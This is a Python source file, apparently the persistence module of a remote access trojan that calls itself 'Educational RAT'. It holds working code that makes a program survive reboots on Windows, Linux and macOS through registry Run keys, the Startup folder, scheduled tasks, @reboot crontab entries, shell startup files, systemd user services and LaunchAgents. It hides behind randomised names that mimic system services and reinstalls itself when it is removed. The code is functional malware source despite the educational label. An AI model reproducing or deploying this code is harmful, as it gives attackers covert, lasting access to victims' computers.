#!/usr/bin/env python3
"""
Multi-platform persistence module for Educational RAT
Demonstrates how malware maintains access after reboot
"""

import os
import sys
import platform
import shutil
import logging
import random
import string

logger = logging.getLogger(__name__)

_SERVICE_NAMES = [
    "WindowsUpdateHelper", "SystemSyncService", "NetworkServiceHost",
    "SecurityUpdateAgent", "BackgroundTaskManager", "SystemHealthMonitor",
    "UpdateOrchestrator", "ServiceHostHelper", "DiagnosticAgent",
]

_INSTALLED_NAME_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".persist_name")


def _random_service_name():
    """Generates a service name that resembles a legitimate system process."""
    base = random.choice(_SERVICE_NAMES)
    suffix = "".join(random.choices(string.hexdigits[:16], k=4))
    return f"{base}_{suffix}"


def _save_installed_name(name):
    with open(_INSTALLED_NAME_FILE, "w") as f:
        f.write(name)


def _load_installed_name():
    if os.path.exists(_INSTALLED_NAME_FILE):
        with open(_INSTALLED_NAME_FILE) as f:
            return f.read().strip()
    return "EduRAT_Service"  # fallback if file absent


def get_persistence_methods():
    """Return available persistence methods for current OS"""
    system = platform.system()
    methods = []
    if system == "Windows":
        methods = ["registry_run", "startup_folder", "scheduled_task"]
    elif system == "Linux":
        methods = ["crontab", "bashrc", "systemd_user"]
    elif system == "Darwin":
        methods = ["launch_agent", "crontab", "bashrc"]
    return methods


def install_persistence(method=None, executable_path=None):
    """Install persistence using specified method"""
    if executable_path is None:
        executable_path = os.path.abspath(sys.argv[0])

    system = platform.system()
    if method is None:
        methods = get_persistence_methods()
        method = methods[0] if methods else None

    if method is None:
        return False, "No persistence method available"

    try:
        if system == "Windows":
            return _persist_windows(method, executable_path)
        elif system == "Linux":
            return _persist_linux(method, executable_path)
        elif system == "Darwin":
            return _persist_macos(method, executable_path)
    except Exception as e:
        return False, f"Persistence error: {e}"

    return False, "Unsupported platform"


def remove_persistence(method=None):
    """Remove installed persistence"""
    system = platform.system()
    if method is None:
        methods = get_persistence_methods()
        method = methods[0] if methods else None

    try:
        if system == "Windows":
            return _remove_windows(method)
        elif system == "Linux":
            return _remove_linux(method)
        elif system == "Darwin":
            return _remove_macos(method)
    except Exception as e:
        return False, f"Remove error: {e}"

    return False, "Unsupported platform"


def check_persistence():
    """Check current persistence status"""
    system = platform.system()
    results = {}
    methods = get_persistence_methods()

    for method in methods:
        try:
            if system == "Windows":
                results[method] = _check_windows(method)
            elif system == "Linux":
                results[method] = _check_linux(method)
            elif system == "Darwin":
                results[method] = _check_macos(method)
        except:
            results[method] = False

    return results


def install_with_fallback(executable_path=None):
    """Tries all persistence methods in order until one succeeds."""
    methods = get_persistence_methods()
    for method in methods:
        success, msg = install_persistence(method=method, executable_path=executable_path)
        if success:
            logger.info(f"Persistence installed via {method}: {msg}")
            return True, method
        logger.warning(f"Method {method} failed: {msg}, trying next...")
    return False, "All persistence methods failed"


def verify(executable_path=None):
    """Checks persistence is active. Re-installs if absent."""
    status = check_persistence()
    if not status:
        return  # unsupported OS — nothing to verify
    if not any(status.values()):
        logger.warning("No persistence found — reinstalling...")
        install_with_fallback(executable_path)


# ─── Windows ─────────────────────────────────────────────────────────

def _persist_windows(method, exe_path):
    svc_name = _random_service_name()

    if method == "registry_run":
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, svc_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        _save_installed_name(svc_name)
        return True, f"Registry Run key added: {svc_name}"

    elif method == "startup_folder":
        startup = os.path.join(os.environ.get("APPDATA", ""),
                               r"Microsoft\Windows\Start Menu\Programs\Startup")
        if not os.path.exists(startup):
            return False, "Startup folder not found"
        dest = os.path.join(startup, f"{svc_name}.pyw")
        shutil.copy2(exe_path, dest)
        _save_installed_name(svc_name)
        return True, f"Copied to Startup: {dest}"

    elif method == "scheduled_task":
        import subprocess
        task_name = svc_name
        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /rl LIMITED /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            _save_installed_name(svc_name)
            return True, f"Scheduled task: {task_name}"
        return False, f"Task creation failed: {result.stderr}"

    return False, f"Unknown method: {method}"


def _remove_windows(method):
    if method == "registry_run":
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, _load_installed_name())
            winreg.CloseKey(key)
            return True, "Registry key removed"
        except OSError:
            return True, "Key was not present"

    elif method == "startup_folder":
        startup = os.path.join(os.environ.get("APPDATA", ""),
                               r"Microsoft\Windows\Start Menu\Programs\Startup")
        path = os.path.join(startup, f"{_load_installed_name()}.pyw")
        if os.path.exists(path):
            os.remove(path)
        return True, "Startup entry removed"

    elif method == "scheduled_task":
        import subprocess
        result = subprocess.run(f'schtasks /delete /tn "{_load_installed_name()}" /f',
                                shell=True, capture_output=True, text=True)
        return True, "Scheduled task removed"

    return False, f"Unknown method: {method}"


def _check_windows(method):
    if method == "registry_run":
        import winreg
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, _load_installed_name())
            winreg.CloseKey(key)
            return True
        except:
            return False

    elif method == "startup_folder":
        startup = os.path.join(os.environ.get("APPDATA", ""),
                               r"Microsoft\Windows\Start Menu\Programs\Startup")
        return os.path.exists(os.path.join(startup, f"{_load_installed_name()}.pyw"))

    elif method == "scheduled_task":
        import subprocess
        result = subprocess.run(f'schtasks /query /tn "{_load_installed_name()}"',
                                shell=True, capture_output=True, text=True)
        return result.returncode == 0

    return False


# ─── Linux ────────────────────────────────────────────────────────────

def _persist_linux(method, exe_path):
    if method == "crontab":
        import subprocess
        cron_entry = f"@reboot {sys.executable} {exe_path} &\n"
        result = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
        current = result.stdout if result.returncode == 0 else ""
        if exe_path not in current:
            new_cron = current + cron_entry
            proc = subprocess.Popen("crontab -", shell=True, stdin=subprocess.PIPE)
            proc.communicate(input=new_cron.encode())
            return True, "Crontab entry added"
        return True, "Already in crontab"

    elif method == "bashrc":
        bashrc = os.path.expanduser("~/.bashrc")
        entry = f"\n# System service\nnohup {sys.executable} {exe_path} > /dev/null 2>&1 &\n"
        content = ""
        if os.path.exists(bashrc):
            with open(bashrc, "r") as f:
                content = f.read()
        if exe_path not in content:
            with open(bashrc, "a") as f:
                f.write(entry)
        return True, "Added to .bashrc"

    elif method == "systemd_user":
        service_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(service_dir, exist_ok=True)
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={sys.executable} {exe_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
        service_path = os.path.join(service_dir, "edu-update.service")
        with open(service_path, "w") as f:
            f.write(service_content)
        import subprocess
        subprocess.run("systemctl --user daemon-reload", shell=True, capture_output=True)
        subprocess.run("systemctl --user enable edu-update.service", shell=True, capture_output=True)
        return True, "Systemd user service installed"

    return False, f"Unknown method: {method}"


def _remove_linux(method):
    if method == "crontab":
        import subprocess
        result = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            lines = [l for l in result.stdout.split("\n") if "edu" not in l.lower() and "rat" not in l.lower()]
            proc = subprocess.Popen("crontab -", shell=True, stdin=subprocess.PIPE)
            proc.communicate(input="\n".join(lines).encode())
        return True, "Crontab entry removed"

    elif method == "bashrc":
        bashrc = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc):
            with open(bashrc, "r") as f:
                lines = f.readlines()
            with open(bashrc, "w") as f:
                skip = False
                for line in lines:
                    if "# System service" in line:
                        skip = True
                        continue
                    if skip:
                        skip = False
                        continue
                    f.write(line)
        return True, "Removed from .bashrc"

    elif method == "systemd_user":
        import subprocess
        subprocess.run("systemctl --user disable edu-update.service", shell=True, capture_output=True)
        service_path = os.path.expanduser("~/.config/systemd/user/edu-update.service")
        if os.path.exists(service_path):
            os.remove(service_path)
        return True, "Systemd service removed"

    return False, f"Unknown method: {method}"


def _check_linux(method):
    if method == "crontab":
        import subprocess
        result = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
        return "edu" in result.stdout.lower() or "rat" in result.stdout.lower()

    elif method == "bashrc":
        bashrc = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc):
            with open(bashrc, "r") as f:
                return "System service" in f.read()
        return False

    elif method == "systemd_user":
        path = os.path.expanduser("~/.config/systemd/user/edu-update.service")
        return os.path.exists(path)

    return False


# ─── macOS ────────────────────────────────────────────────────────────

def _persist_macos(method, exe_path):
    if method == "launch_agent":
        agents_dir = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(agents_dir, exist_ok=True)
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.edu.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
        plist_path = os.path.join(agents_dir, "com.edu.update.plist")
        with open(plist_path, "w") as f:
            f.write(plist_content)
        import subprocess
        subprocess.run(f"launchctl load {plist_path}", shell=True, capture_output=True)
        return True, "LaunchAgent installed"

    elif method == "crontab":
        return _persist_linux("crontab", exe_path)

    elif method == "bashrc":
        zshrc = os.path.expanduser("~/.zshrc")
        entry = f"\n# System service\nnohup {sys.executable} {exe_path} > /dev/null 2>&1 &\n"
        target = zshrc if os.path.exists(zshrc) else os.path.expanduser("~/.bashrc")
        content = ""
        if os.path.exists(target):
            with open(target, "r") as f:
                content = f.read()
        if exe_path not in content:
            with open(target, "a") as f:
                f.write(entry)
        return True, f"Added to {target}"

    return False, f"Unknown method: {method}"


def _remove_macos(method):
    if method == "launch_agent":
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.edu.update.plist")
        import subprocess
        subprocess.run(f"launchctl unload {plist_path}", shell=True, capture_output=True)
        if os.path.exists(plist_path):
            os.remove(plist_path)
        return True, "LaunchAgent removed"
    elif method == "crontab":
        return _remove_linux("crontab")
    elif method == "bashrc":
        for rc in ["~/.zshrc", "~/.bashrc"]:
            path = os.path.expanduser(rc)
            if os.path.exists(path):
                with open(path, "r") as f:
                    lines = f.readlines()
                with open(path, "w") as f:
                    skip = False
                    for line in lines:
                        if "# System service" in line:
                            skip = True
                            continue
                        if skip:
                            skip = False
                            continue
                        f.write(line)
        return True, "RC entry removed"

    return False, f"Unknown method: {method}"


def _check_macos(method):
    if method == "launch_agent":
        return os.path.exists(os.path.expanduser("~/Library/LaunchAgents/com.edu.update.plist"))
    elif method == "crontab":
        return _check_linux("crontab")
    elif method == "bashrc":
        for rc in ["~/.zshrc", "~/.bashrc"]:
            path = os.path.expanduser(rc)
            if os.path.exists(path):
                with open(path, "r") as f:
                    if "System service" in f.read():
                        return True
        return False
    return False
